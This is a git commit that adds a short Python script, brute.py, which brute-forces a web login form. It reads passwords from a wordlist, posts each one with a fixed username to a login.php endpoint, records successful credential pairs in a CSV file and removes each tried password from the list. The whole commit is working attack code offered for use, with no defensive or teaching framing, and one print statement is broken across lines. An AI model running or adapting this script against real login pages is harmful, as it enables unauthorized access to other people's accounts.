cce15ef38a82e0fd918aacc00995c9c6b62254da
hacker1347 <134107495+hacker1347@users.noreply.github.com>
2023-12-12 21:01:48 +0100

    Update brute.py

--- brute.py
+++ brute.py
@@ -1,1 +1,32 @@
 
+import sys
+import requests
+
+def send_request(target, username, password):
+    sys.stdout.write("\r\t\t\t\t\t\t\t")
+    sys.stdout.flush()
+    sys.stdout.write("\r[!] Testing username and password: " + username + "|" + password)
+    sys.stdout.flush()
+    try:
+        response = requests.post(target, { "username": username, "password": password })
+        if response.status_code == 200 and response.json()["result"] == "success":
+            sys.stdout.write("\r\t\t\t\t\t\t\t")
+            sys.stdout.flush()
+            print("\r[+] Login: %s
+[+] Password: %s
+" % (username, password))
+            open("saves.csv", "a").write(username + "," + password + "\n")
+    except requests.RequestException:
+        sys.stdout.write("\r\t\t\t\t\t\t\t")
+        sys.stdout.flush()
+        sys.stdout.write("\r[!] An error occurred while sending the request.")
+        sys.stdout.flush()
+
+def remove_first_line(filename):
+    passwordList = open(filename, "r").readlines()[1:]
+    open(filename, "w").writelines(passwordList)
+
+filename = "passwords.txt"
+for password in open(filename, "r"):
+    send_request("http://.../login.php", "username", password.strip())
+    remove_first_line(filename)
